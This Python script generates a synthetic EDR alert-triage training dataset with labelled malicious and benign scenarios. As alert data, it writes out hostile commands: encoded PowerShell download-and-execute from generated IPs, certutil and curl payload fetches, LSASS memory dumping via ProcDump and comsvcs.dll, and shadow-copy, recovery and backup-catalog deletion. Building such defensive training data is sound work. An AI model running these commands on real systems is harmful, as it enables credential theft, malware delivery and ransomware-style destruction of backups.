"""
Synthetic EDR alert triage dataset generator.

Builds realistic EDR alerts (Defender / CrowdStrike style) for 15 detection
scenarios mapped to MITRE ATT&CK. Each scenario has malicious and benign
variants, so the model learns to separate attacks from noise using the
evidence in the alert (parent process, path, signer, user, host role, time,
network destination) instead of calling everything an incident.

Labels:
  True Positive          - malicious activity, real incident
  Benign True Positive   - detection fired correctly, activity is authorized
  False Positive         - detection logic misfired on normal OS/app behavior
  Needs Investigation    - evidence is ambiguous, escalate with context

Output (Unsloth / chat-template ready):
  data/train.jsonl, data/test.jsonl   {"conversations":[{role,content},...]}
  data/preview.csv                    flat view for the dataset screenshot
  data/showcase_alerts.md             3 held-out alerts for the comparison
Python 3.8 compatible, standard library only.
"""
import base64
import csv
import json
import os
import random
from datetime import datetime, timedelta

SEED = 1337
SAMPLES_PER_VARIANT = 30
TEST_FRACTION = 0.1
OUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")

SYSTEM_PROMPT = (
    "You are a Tier-2 SOC analyst. Triage the EDR alert you are given. "
    "Decide whether it is a True Positive, Benign True Positive, False Positive, "
    "or Needs Investigation, map it to MITRE ATT&CK, cite the specific evidence "
    "from the alert, and give concrete next actions. Use the exact output format."
)

R = random.Random(SEED)

FIRST = ["james", "maria", "wei", "aisha", "daniel", "priya", "lucas", "fatima",
         "ethan", "sofia", "noah", "yuki", "omar", "elena", "kevin", "grace",
         "diego", "hannah", "raj", "chloe"]
LAST = ["reyes", "chen", "patel", "okafor", "miller", "nguyen", "rossi", "kim",
        "garcia", "schmidt", "johnson", "haddad", "silva", "brown", "tanaka",
        "kowalski", "murphy", "ali", "fischer", "lopez"]
DEPTS = [("FIN", "Finance Workstations"), ("HR", "HR Workstations"),
         ("SLS", "Sales Workstations"), ("MKT", "Marketing Workstations"),
         ("ENG", "Engineering Workstations"), ("LGL", "Legal Workstations")]
OS_WS = ["Windows 11 23H2", "Windows 11 24H2", "Windows 10 22H2"]
OS_SRV = ["Windows Server 2022", "Windows Server 2019"]
BAD_TLDS = [".top", ".xyz", ".icu", ".shop", ".online", ".site"]
BAD_WORDS = ["cdn-update", "secure-docs", "msoffice-sync", "invoice-portal",
             "cloud-share", "doc-viewer", "support-desk", "files-dl"]


# --------------------------------------------------------------------- helpers
def pick(seq):
    return R.choice(seq)


def user():
    return pick(FIRST)[0] + pick(LAST)


def admin_user():
    return "adm-" + user()


def sha256():
    return "".join(R.choice("0123456789abcdef") for _ in range(64))


def ext_ip():
    first = pick([45, 91, 103, 141, 176, 185, 193, 194, 212, 217])
    return "{}.{}.{}.{}".format(first, R.randint(1, 254), R.randint(1, 254), R.randint(1, 254))


def bad_domain():
    return pick(BAD_WORDS) + str(R.randint(1, 99)) + pick(BAD_TLDS)


def rand_name(n=6):
    return "".join(R.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(n))


def ts(profile="business"):
    day = datetime(2026, 1, 5) + timedelta(days=R.randint(0, 240))
    if profile == "offhours":
        hour = pick([0, 1, 2, 3, 4, 5, 22, 23])
    elif profile == "night_window":  # approved maintenance window
        hour = pick([1, 2, 3])
    elif profile == "any":
        hour = R.randint(0, 23)
    else:
        hour = R.randint(8, 17)
    t = day.replace(hour=hour, minute=R.randint(0, 59), second=R.randint(0, 59))
    return t.strftime("%Y-%m-%dT%H:%M:%SZ"), hour


def is_offhours(h):
    return h < 7 or h > 19


def offhours_note(hour):
    return "Activity occurred at {:02d}:00 UTC, outside normal business hours.".format(hour)


def ws_host():
    code, group = pick(DEPTS)
    return "WS-{}-{:03d}".format(code, R.randint(1, 250)), group, pick(OS_WS)


def srv_host(kind):
    names = {
        "file": ("SRV-FILE{:02d}", "File Servers"),
        "web": ("SRV-WEB{:02d}", "Internet-Facing Web Servers"),
        "app": ("SRV-APP{:02d}", "Application Servers"),
        "bkp": ("SRV-BKP{:02d}", "Backup Servers"),
        "jmp": ("JMP-ADM{:02d}", "Admin Jump Servers"),
    }
    if kind == "help":
        return "WS-IT-{:03d}".format(R.randint(1, 60)), "IT Helpdesk Workstations", pick(OS_WS)
    fmt, group = names[kind]
    return fmt.format(R.randint(1, 12)), group, pick(OS_SRV)


def ps_enc(script):
    return base64.b64encode(script.encode("utf-16-le")).decode()


def tri(verdict, conf, sev, mitre, summary, evidence, actions):
    return dict(verdict=verdict, conf=conf, sev=sev, mitre=mitre,
                summary=summary, evidence=evidence, actions=actions)


def alert(title, vendor_sev, time, host, group, os_, usr, process, cmdline, parent, signer, extra):
    return dict(title=title, vendor_sev=vendor_sev, time=time, host=host, group=group,
                os=os_, user=usr, process=process, cmdline=cmdline, parent=parent,
                signer=signer, sha=sha256(), extra=extra)


# ------------------------------------------------------------------- scenarios
# Each variant returns (alert_dict, triage_dict).

def lsass_procdump():
    u = user(); host, grp, os_ = ws_host(); t, h = ts(pick(["business", "offhours"]))
    exe = pick(["pd64.exe", "pdump.exe", "p.exe", "svc.exe"])
    out = "C:\\Users\\Public\\{}.dmp".format(pick(["l", "out", "debug", "mem"]))
    a = alert("Suspicious access to LSASS process memory", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Users\\{}\\AppData\\Local\\Temp\\{}".format(u, exe),
              "{} -accepteula -ma lsass.exe {}".format(exe, out),
              "cmd.exe <- powershell.exe <- explorer.exe",
              "Microsoft Corporation (Sysinternals ProcDump, renamed)",
              "Target: lsass.exe, GrantedAccess 0x1FFFFF; dump file {} created (48 MB)".format(out))
    ev = ["ProcDump was renamed to {} and executed from AppData\\Local\\Temp, not an IT tooling path.".format(exe),
          "The -ma lsass.exe flags create a full memory dump of LSASS, which contains credential material.",
          "The dump was written to {}, a world-readable location typical of staging for exfiltration.".format(out),
          "Standard user {} on a {} host has no business reason to dump LSASS.".format(u, grp)]
    if is_offhours(h):
        ev.append(offhours_note(h))
    return a, tri("True Positive", "High", "Critical", "T1003.001 - OS Credential Dumping: LSASS Memory",
                  "A renamed ProcDump binary running from a user Temp folder dumped LSASS memory to a world-readable path, which is credential theft.",
                  ev,
                  ["Isolate {} from the network immediately.".format(host),
                   "Reset passwords for {} and every account with an active session on the host, and revoke Kerberos tickets.".format(u),
                   "Collect {} and the {} binary for forensics, then remove the dump from the host.".format(out, exe),
                   "Hunt for logons by the exposed accounts on other hosts in the last 24 hours to detect lateral movement."])


def lsass_comsvcs():
    u = user(); host, grp, os_ = ws_host(); t, h = ts(pick(["business", "offhours"]))
    lp = R.randint(600, 980); out = "C:\\Windows\\Temp\\{}.bin".format(rand_name(4))
    a = alert("LSASS memory dump via comsvcs.dll MiniDump", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\rundll32.exe",
              "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {} {} full".format(lp, out),
              "powershell.exe <- cmd.exe <- {}.exe".format(rand_name(7)),
              "Microsoft Windows",
              "lsass.exe PID is {}; file {} created".format(lp, out))
    return a, tri("True Positive", "High", "Critical",
                  "T1003.001 - OS Credential Dumping: LSASS Memory (via T1218.011 Rundll32)",
                  "rundll32 invoked the comsvcs.dll MiniDump export against the LSASS PID, a well-known living-off-the-land credential dumping technique.",
                  ["The MiniDump export of comsvcs.dll targets PID {}, which is lsass.exe.".format(lp),
                   "Legitimate software does not call comsvcs.dll MiniDump from the command line.",
                   "The parent chain starts from an unknown binary and runs through powershell.exe, not an IT management agent.",
                   "The dump file {} was written to a temp path for later retrieval.".format(out)],
                  ["Isolate {} immediately.".format(host),
                   "Reset credentials for {} and all accounts logged on to the host, prioritizing privileged accounts.".format(u),
                   "Acquire the dump file and the unknown parent binary for analysis.",
                   "Search the fleet for other comsvcs.dll MiniDump command lines in the last 7 days."])


def lsass_werfault():
    host, grp, os_ = srv_host(pick(["app", "file"])); t, h = ts("any")
    lp = R.randint(600, 980)
    a = alert("Process accessed LSASS memory", "Medium", t, host, grp, os_, "NT AUTHORITY\\SYSTEM",
              "C:\\Windows\\System32\\WerFault.exe",
              "C:\\Windows\\system32\\WerFault.exe -u -p {} -s {}".format(lp, R.randint(100, 900)),
              "svchost.exe -k WerSvcGroup <- services.exe", "Microsoft Windows",
              "Application Error event 1000 for lsass.exe logged 2 seconds earlier; report queued to C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue")
    return a, tri("False Positive", "High", "Informational",
                  "T1003.001 - OS Credential Dumping: LSASS Memory (detection category only)",
                  "Windows Error Reporting opened LSASS after a crash; this is normal OS crash handling, not credential dumping.",
                  ["WerFault.exe is Microsoft-signed and running from System32 as SYSTEM.",
                   "The parent is the WerSvc service host, the expected launcher for crash reporting.",
                   "An Application Error event for lsass.exe immediately preceded the access.",
                   "Output went to the standard WER ReportQueue, not a staging path."],
                  ["Close as False Positive.",
                   "Open a ticket with the server team, since an LSASS crash on {} may indicate instability or a faulty driver.".format(host),
                   "Tune the rule to exclude WerFault.exe launched by the WerSvc service when a preceding crash event exists."])


def ps_encoded_office():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    ip = ext_ip(); path = pick(["a", "s", "p.ps1", "update"])
    script = "IEX (New-Object Net.WebClient).DownloadString('http://{}/{}')".format(ip, path)
    parent = pick(["WINWORD.EXE", "EXCEL.EXE"])
    doc = pick(["Invoice_{}.docm", "Remittance_{}.xlsm", "PO_{}.docm"]).format(R.randint(1000, 9999))
    a = alert("Encoded PowerShell command spawned by Office application", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "powershell.exe -nop -w hidden -enc {}".format(ps_enc(script)),
              "{} <- explorer.exe".format(parent), "Microsoft Windows",
              "Office document: ...\\Content.Outlook\\{}\\{}; outbound TCP {}:80 two seconds after launch".format(rand_name(8).upper(), doc, ip))
    return a, tri("True Positive", "High", "High",
                  "T1059.001 - Command and Scripting Interpreter: PowerShell; T1566.001 - Phishing: Spearphishing Attachment",
                  "A macro-enabled document opened from Outlook launched hidden, encoded PowerShell that downloads and executes a remote script.",
                  ["The base64 decodes to: {}".format(script),
                   "{} spawning PowerShell with -nop -w hidden is a classic malicious macro pattern.".format(parent),
                   "The document {} was opened from the Outlook attachment cache.".format(doc),
                   "The host connected to raw IP {} immediately after launch.".format(ip)],
                  ["Isolate {} and kill the PowerShell process tree.".format(host),
                   "Block {} at the firewall and proxy, and retrieve the second-stage payload if it is still hosted.".format(ip),
                   "Find and purge the phishing email carrying {} from all mailboxes.".format(doc),
                   "Reset {}'s credentials and check for persistence created after the execution time.".format(u)])


def ps_encoded_sccm():
    host, grp, os_ = ws_host(); t, h = ts(pick(["business", "night_window"]))
    script = pick([
        "Get-WmiObject -Class Win32_Product | Select-Object Name,Version | Export-Csv C:\\Windows\\CCM\\Inventory\\apps.csv -NoTypeInformation",
        "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName,DisplayVersion",
        "if ((Get-Service -Name 'CcmExec').Status -ne 'Running') { exit 1 } else { exit 0 }",
        "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5"])
    a = alert("Suspicious encoded PowerShell command", "Medium", t, host, grp, os_, "NT AUTHORITY\\SYSTEM",
              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {}".format(ps_enc(script)),
              "CcmExec.exe <- services.exe", "Microsoft Windows",
              "Parent C:\\Windows\\CCM\\CcmExec.exe is Microsoft-signed; no network connections from the PowerShell process")
    return a, tri("Benign True Positive", "High", "Low",
                  "T1059.001 - Command and Scripting Interpreter: PowerShell (authorized use)",
                  "Configuration Manager (SCCM) ran an encoded PowerShell script for inventory or compliance; encoding is how SCCM passes scripts, and the content is benign.",
                  ["The parent is CcmExec.exe, the signed SCCM client service, running as SYSTEM.",
                   "The base64 decodes to: {}".format(script),
                   "The decoded script only reads system state and downloads or executes nothing.",
                   "The PowerShell process made no network connections."],
                  ["Close as Benign True Positive.",
                   "Confirm the script matches an approved SCCM configuration item or script in the console.",
                   "Tune the rule to suppress encoded PowerShell when the parent is a signed CcmExec.exe and the decoded content matches approved scripts."])


def ps_encoded_ambiguous():
    adm = admin_user(); host, grp, os_ = ws_host(); t, h = ts("business")
    script = pick([
        "Get-ADComputer -Filter * -Properties OperatingSystem | Export-Csv $env:TEMP\\c.csv",
        "Get-ADGroupMember 'Domain Admins' -Recursive | Select SamAccountName",
        "Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv $env:TEMP\\u.csv"])
    a = alert("Suspicious encoded PowerShell command", "Medium", t, host, grp, os_, "CORP\\" + adm,
              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "powershell.exe -enc {}".format(ps_enc(script)),
              "cmd.exe <- explorer.exe", "Microsoft Windows",
              "RSAT ActiveDirectory module loaded; no outbound connections; host is not an admin jump server")
    return a, tri("Needs Investigation", "Medium", "Medium",
                  "T1087.002 - Account Discovery: Domain Account; T1059.001 - PowerShell",
                  "An admin account ran encoded Active Directory enumeration from a standard user workstation; it may be legitimate admin work, but the encoding and location are unusual.",
                  ["The base64 decodes to: {}".format(script),
                   "{} is a privileged account, so the activity could be routine administration.".format(adm),
                   "Admin work is expected on jump servers, but this ran on {}, a {} host.".format(host, grp),
                   "Encoding a plain AD query has no operational purpose and is a common evasion habit."],
                  ["Contact the owner of {} to confirm the activity and ask for a change or ticket reference.".format(adm),
                   "Review {} sign-ins over the last 24 hours for unusual source hosts or MFA anomalies.".format(adm),
                   "If unconfirmed within 1 hour, escalate to True Positive, disable the account, and isolate {}.".format(host)])


def certutil_download():
    u = user(); host, grp, os_ = ws_host(); t, h = ts(pick(["business", "offhours"]))
    ip = ext_ip(); name = rand_name(5)
    a = alert("Certutil used to download file from internet", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\certutil.exe",
              "certutil.exe -urlcache -split -f http://{}:{}/{}.txt C:\\Users\\Public\\{}.exe".format(ip, pick([80, 8080, 8443]), name, name),
              "cmd.exe <- {}".format(pick(["wscript.exe", "mshta.exe", "rundll32.exe"])), "Microsoft Windows",
              "New unsigned PE file C:\\Users\\Public\\{}.exe written (VirusTotal: not found); executed 6 seconds later".format(name))
    ev = ["The -urlcache -split -f flags are the known certutil download technique, and admins do not fetch files this way.",
          "The source is a raw external IP, {}, not a vendor or internal domain.".format(ip),
          "A .txt was saved as C:\\Users\\Public\\{}.exe and executed, a file-type masquerade.".format(name),
          "The parent chain comes from a script host, consistent with a malicious script or HTA."]
    if is_offhours(h):
        ev.append(offhours_note(h))
    return a, tri("True Positive", "High", "High",
                  "T1105 - Ingress Tool Transfer; T1218 - System Binary Proxy Execution",
                  "certutil.exe was abused to download an executable disguised as a .txt from a raw IP, which then ran; this is a malware delivery chain.",
                  ev,
                  ["Isolate {} and terminate {}.exe.".format(host, name),
                   "Submit {}.exe for sandbox analysis and extract C2 indicators.".format(name),
                   "Block {} and sweep the fleet for connections to it and for the file hash.".format(ip),
                   "Identify the script that launched the chain, such as an email attachment or download, and scope other recipients."])


def certutil_decode():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    n = rand_name(6)
    a = alert("Certutil decoding of suspicious file", "Medium", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\certutil.exe",
              "certutil -decode C:\\Users\\{0}\\AppData\\Local\\Temp\\{1}.b64 C:\\Users\\{0}\\AppData\\Local\\Temp\\{1}.dll".format(u, n),
              "cmd.exe <- wscript.exe <- explorer.exe", "Microsoft Windows",
              "{}.b64 was extracted from a ZIP downloaded by msedge.exe 40 seconds earlier; resulting DLL loaded by rundll32.exe".format(n))
    return a, tri("True Positive", "High", "High",
                  "T1140 - Deobfuscate/Decode Files or Information; T1105 - Ingress Tool Transfer",
                  "certutil decoded a base64 blob from a downloaded ZIP into a DLL that was immediately loaded, a common loader technique.",
                  ["The command decodes {0}.b64 into {0}.dll in the user's Temp folder.".format(n),
                   "The encoded file arrived in a browser-downloaded ZIP 40 seconds earlier.",
                   "wscript.exe launched the chain, so a script inside the ZIP was double-clicked.",
                   "rundll32 loaded the decoded DLL right after, so the payload executed."],
                  ["Isolate {}.".format(host),
                   "Collect the ZIP, the .b64 file, and the DLL for analysis and record their hashes.",
                   "Review browser history for the download URL and block the domain.",
                   "Check for persistence created by the DLL, such as Run keys and scheduled tasks."])


def certutil_hashfile():
    adm = admin_user(); host, grp, os_ = srv_host("help"); t, h = ts("business")
    f = pick(["Zoom_6.2.msi", "AcroRdr_2025.msi", "7z2409-x64.msi", "Firefox_Setup_131.exe", "npp.8.7.Installer.x64.exe"])
    a = alert("Suspicious certutil execution", "Low", t, host, grp, os_, "CORP\\" + adm,
              "C:\\Windows\\System32\\certutil.exe",
              "certutil -hashfile C:\\Users\\{}\\Downloads\\{} SHA256".format(adm, f),
              "cmd.exe <- explorer.exe", "Microsoft Windows", "No network connections; no files written")
    return a, tri("False Positive", "High", "Informational",
                  "T1218 - System Binary Proxy Execution (detection category only)",
                  "An IT admin used certutil -hashfile to verify an installer checksum, a standard and harmless use of certutil.",
                  ["The -hashfile option only computes a hash and cannot download or decode content.",
                   "The target is a known vendor installer, {}, in the admin's Downloads folder.".format(f),
                   "{} is an IT account on an IT Helpdesk workstation.".format(adm),
                   "No network activity and no file writes were observed."],
                  ["Close as False Positive.",
                   "Tune the rule to alert only on certutil with -urlcache, -decode, -encode, or -verifyctl, not -hashfile."])


def office_child_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    dom = bad_domain()
    child = pick([
        ("cmd.exe", "cmd.exe /c mshta.exe https://{}/v.hta".format(dom)),
        ("mshta.exe", "mshta.exe https://{}/doc.hta".format(dom)),
        ("cmd.exe", "cmd.exe /c curl -s https://{}/x -o %TEMP%\\x.exe && %TEMP%\\x.exe".format(dom))])
    doc = pick(["Payment_Advice_{}.xlsm", "Contract_Review_{}.docm", "Shipping_{}.xlsm"]).format(R.randint(100, 999))
    parent = "EXCEL.EXE" if doc.endswith("xlsm") else "WINWORD.EXE"
    a = alert("Office application spawned suspicious child process", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\" + child[0], child[1],
              "{} <- OUTLOOK.EXE <- explorer.exe".format(parent), "Microsoft Windows",
              "Document {} opened from an email received 3 minutes earlier from an external sender; DNS query for {}".format(doc, dom))
    return a, tri("True Positive", "High", "High",
                  "T1204.002 - User Execution: Malicious File; T1566.001 - Spearphishing Attachment",
                  "A macro document from an external email spawned {} to fetch a remote payload from a newly seen domain.".format(child[0]),
                  ["{} spawned {}, which Office does not do during normal use.".format(parent, child[0]),
                   "The command pulls content from {}, a suspicious-TLD domain.".format(dom),
                   "{} was opened from Outlook 3 minutes after delivery from an external sender.".format(doc),
                   "The chain matches a standard phishing initial-access pattern."],
                  ["Isolate {} and terminate the process tree.".format(host),
                   "Block {} at DNS and proxy, and search proxy logs for other clients that resolved it.".format(dom),
                   "Purge the email from all mailboxes and identify other recipients.",
                   "Reset {}'s credentials and review mailbox rules for attacker changes.".format(u)])


def office_child_splwow():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    parent = pick(["WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE"])
    a = alert("Office application spawned child process", "Medium", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\splwow64.exe", "C:\\Windows\\splwow64.exe {}".format(R.randint(8000, 12500)),
              "{} <- explorer.exe".format(parent), "Microsoft Windows",
              "Print job submitted to \\\\PRT-{}-{:02d} at the same timestamp".format(pick(["FL2", "FL3", "HQ"]), R.randint(1, 20)))
    return a, tri("False Positive", "High", "Informational",
                  "T1204.002 - User Execution: Malicious File (detection category only)",
                  "splwow64.exe is the Windows print driver host that Office launches when printing; this is normal behavior.",
                  ["splwow64.exe is a Microsoft-signed binary in C:\\Windows that handles 32/64-bit print translation.",
                   "A print job was submitted at the same moment the process started.",
                   "No internet connections and no script interpreters were involved."],
                  ["Close as False Positive.",
                   "Add splwow64.exe as a known-good child of Office applications in the detection rule."])


def office_child_addin():
    u = user(); host = "WS-FIN-{:03d}".format(R.randint(1, 250)); t, h = ts("business")
    tool = pick([("C:\\Program Files (x86)\\blp\\API\\Office Tools\\bplus.exe", "Bloomberg Finance L.P."),
                 ("C:\\Program Files\\Power BI Desktop\\bin\\PBIDesktop.exe", "Microsoft Corporation"),
                 ("C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe", "Adobe Inc.")])
    a = alert("Office application spawned child process", "Medium", t, host, "Finance Workstations", pick(OS_WS), "CORP\\" + u,
              tool[0], '"{}" /embedding'.format(tool[0]), "EXCEL.EXE <- explorer.exe", tool[1],
              "Binary installed via Software Center; seen on 140 hosts in the last 30 days")
    return a, tri("Benign True Positive", "High", "Low",
                  "T1204.002 - User Execution (authorized software)",
                  "Excel launched a signed, widely deployed business application through its add-in integration; the detection fired correctly, but the activity is expected.",
                  ["The child binary is signed by {} and installed in Program Files.".format(tool[1]),
                   "It was deployed through Software Center and is seen on 140 hosts, so it is prevalent and approved.",
                   "The /embedding argument is the normal COM automation launch mode.",
                   "No suspicious network connections or script interpreters are involved."],
                  ["Close as Benign True Positive.",
                   "Add this signer and path to the Office child-process allowlist."])


def schtask_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts(pick(["business", "offhours"]))
    tn = pick(["MicrosoftEdgeUpdateTaskCore", "OneDrive Standalone Update", "WindowsDefenderUpdate", "GoogleUpdateTaskUser"])
    b = pick(["C:\\Users\\Public\\Libraries\\{}.exe".format(rand_name(6)),
              "C:\\ProgramData\\{}\\svc.exe".format(rand_name(6)),
              "C:\\Users\\{}\\AppData\\Roaming\\{}.exe".format(u, rand_name(6))])
    a = alert("Suspicious scheduled task created", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\schtasks.exe",
              'schtasks /create /tn "{}" /tr "{}" /sc onlogon /rl highest /f'.format(tn, b),
              "powershell.exe <- {}.exe".format(rand_name(6)), "Microsoft Windows",
              "Task binary {} is unsigned, has 0 prevalence in the environment, and was created 20 seconds earlier".format(b))
    return a, tri("True Positive", "High", "High",
                  "T1053.005 - Scheduled Task/Job: Scheduled Task; T1036.004 - Masquerade Task or Service",
                  "A scheduled task with a fake vendor name was created to launch an unsigned binary at every logon, which is malware persistence.",
                  ["The task name '{}' imitates a legitimate updater, but real updaters live in Program Files.".format(tn),
                   "The task runs {}, an unsigned binary with zero prevalence in a user-writable path.".format(b),
                   "The /sc onlogon /rl highest settings give the payload persistence with elevated rights.",
                   "The parent chain starts from an unknown executable, not an installer or management agent."],
                  ["Isolate {}.".format(host),
                   "Delete the '{}' task and quarantine {}.".format(tn, b),
                   "Analyze the unknown parent executable to find the initial infection vector.",
                   "Sweep the fleet for scheduled tasks pointing to Public, ProgramData, or AppData paths."])


def schtask_benign():
    host, grp, os_ = ws_host(); t, h = ts("business")
    v = pick([("GoogleUpdateTaskMachineUA", "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe", "Google LLC"),
              ("Adobe Acrobat Update Task", "C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe", "Adobe Inc."),
              ("MicrosoftEdgeUpdateTaskMachineCore", "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe", "Microsoft Corporation")])
    a = alert("Suspicious scheduled task created", "Medium", t, host, grp, os_, "NT AUTHORITY\\SYSTEM",
              "C:\\Windows\\System32\\schtasks.exe",
              'schtasks /create /tn "{}" /xml "C:\\Windows\\Temp\\{}.xml" /f'.format(v[0], rand_name(8)),
              "{} /install <- msiexec.exe".format(v[1].split("\\")[-1]), v[2],
              "Task action points to {} (signed by {}); software install event recorded at the same time".format(v[1], v[2]))
    return a, tri("Benign True Positive", "High", "Low",
                  "T1053.005 - Scheduled Task (authorized software updater)",
                  "A signed software installer registered its standard auto-update task; the activity is expected.",
                  ["The task '{}' is the vendor's documented update task.".format(v[0]),
                   "Its action points to {}, signed by {}, in Program Files.".format(v[1], v[2]),
                   "It was created by msiexec.exe during a software install running as SYSTEM."],
                  ["Close as Benign True Positive.",
                   "Allowlist this task name when the action binary is signed by {} and located in Program Files.".format(v[2])])


def runkey_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    vn = pick(["WindowsDefender", "OneDriveUpdate", "SecurityHealth", "AdobeUpdater"])
    bn = pick(["svch0st.exe", "dllhst.exe", "winupdt.exe", "rundl.exe"])
    b = "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\{}".format(u, bn)
    a = alert("Registry Run key persistence", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\reg.exe",
              'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{}" /t REG_SZ /d "{}" /f'.format(vn, b),
              "cmd.exe <- {}".format(pick(["wscript.exe", "mshta.exe", "powershell.exe"])), "Microsoft Windows",
              "{} is unsigned with 0 prevalence and makes HTTPS beacons to {} every 60 seconds".format(b, ext_ip()))
    return a, tri("True Positive", "High", "High",
                  "T1547.001 - Boot or Logon Autostart: Registry Run Keys; T1036.005 - Masquerading",
                  "A Run key with a security-product name was added to launch a misspelled, unsigned binary that is beaconing outbound.",
                  ["The value name '{}' imitates a legitimate product, but the binary is in AppData\\Roaming.".format(vn),
                   "The binary name {} misspells a Windows process name, a masquerading tell.".format(bn),
                   "The binary is unsigned, has zero prevalence, and makes periodic outbound beacons.",
                   "reg.exe was launched from a script host, not an installer."],
                  ["Isolate {}.".format(host),
                   "Remove the '{}' Run value and quarantine the binary.".format(vn),
                   "Block the beacon destination and search for other hosts contacting it.",
                   "Investigate how the script host was launched to find the initial access vector."])


def runkey_benign():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    v = pick([("com.squirrel.Teams.Teams", "C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Teams\\Update.exe --processStart \"Teams.exe\"", "Microsoft Corporation", "Update.exe"),
              ("OneDrive", "\"C:\\Users\\{u}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background", "Microsoft Corporation", "OneDriveSetup.exe"),
              ("Zoom", "\"C:\\Users\\{u}\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe\" --autostart", "Zoom Communications, Inc.", "Zoom.exe")])
    d = v[1].replace("{u}", u)
    a = alert("Registry Run key persistence", "Medium", t, host, grp, os_, "CORP\\" + u,
              v[3], "(registry write) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{} = {}".format(v[0], d),
              "{} <- explorer.exe".format(v[3]), v[2],
              "Writing process is signed by {}; application is present on most hosts".format(v[2]))
    return a, tri("Benign True Positive", "High", "Low",
                  "T1547.001 - Registry Run Keys (authorized application autostart)",
                  "A signed, widely used application registered its normal per-user autostart entry.",
                  ["The value '{}' and its target match the vendor's standard autostart configuration.".format(v[0]),
                   "The writing process is signed by {}.".format(v[2]),
                   "The application is prevalent across the environment, and no suspicious network activity was seen."],
                  ["Close as Benign True Positive.",
                   "Allowlist Run key writes by this signed binary for this value name."])


def vss_mal():
    host, grp, os_ = srv_host("file"); t, h = ts("offhours")
    b = "C:\\ProgramData\\{}\\{}.exe".format(rand_name(5), rand_name(6))
    a = alert("Volume shadow copy deletion", "Critical", t, host, grp, os_, "CORP\\" + pick(["svc_sql", "svc_print", admin_user()]),
              "C:\\Windows\\System32\\vssadmin.exe",
              pick(["vssadmin.exe delete shadows /all /quiet", "vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB"]),
              "cmd.exe <- {}".format(b), "Microsoft Windows",
              "Within 30 seconds the same parent ran: wmic shadowcopy delete; bcdedit /set {default} recoveryenabled no; wbadmin delete catalog -quiet")
    return a, tri("True Positive", "High", "Critical",
                  "T1490 - Inhibit System Recovery; likely precursor to T1486 - Data Encrypted for Impact",
                  "An unknown binary is destroying shadow copies, the backup catalog, and boot recovery on a file server; this is imminent ransomware.",
                  ["Shadow copies, the backup catalog, and recovery mode were all removed within 30 seconds.",
                   "The parent {} is an unknown binary in ProgramData.".format(b),
                   "The target is {}, a file server holding shared data.".format(host),
                   offhours_note(h)],
                  ["Isolate {} immediately and treat this as an active ransomware incident.".format(host),
                   "Disable the account that ran the command and review its recent logons across the domain.",
                   "Protect backups by confirming offline or immutable copies are intact, and disconnect backup networks if needed.",
                   "Activate the incident response plan and notify IR leadership."])


def vss_benign():
    host, grp, os_ = srv_host(pick(["file", "app"])); t, h = ts("night_window")
    agent = pick([("C:\\Program Files\\Veeam\\Endpoint Backup\\Veeam.EndPoint.Service.exe", "Veeam Software Group GmbH"),
                  ("C:\\Program Files\\Commvault\\ContentStore\\Base\\clBackup.exe", "Commvault Systems, Inc.")])
    a = alert("Volume shadow copy manipulation", "Medium", t, host, grp, os_, "NT AUTHORITY\\SYSTEM",
              "C:\\Windows\\System32\\vssadmin.exe",
              pick(["vssadmin.exe list shadows", "vssadmin.exe list writers",
                    "vssadmin.exe delete shadows /shadow={%s-%s} /quiet" % (rand_name(8), rand_name(4))]),
              "cmd.exe <- {}".format(agent[0]), agent[1],
              "Backup job started on {} at the same time; at most a single snapshot ID is referenced, never /all".format(host))
    return a, tri("Benign True Positive", "High", "Low",
                  "T1490 - Inhibit System Recovery (detection category only)",
                  "The backup agent managed its own shadow copies during the nightly backup job; this is expected backup behavior.",
                  ["The parent is the backup agent, signed by {}.".format(agent[1]),
                   "The activity coincides with a scheduled backup job in the nightly window.",
                   "The command lists shadows or removes a single snapshot, not all of them, and no recovery or catalog tampering followed."],
                  ["Close as Benign True Positive.",
                   "Allowlist vssadmin activity whose parent is the signed backup agent, but keep alerting on delete /all."])


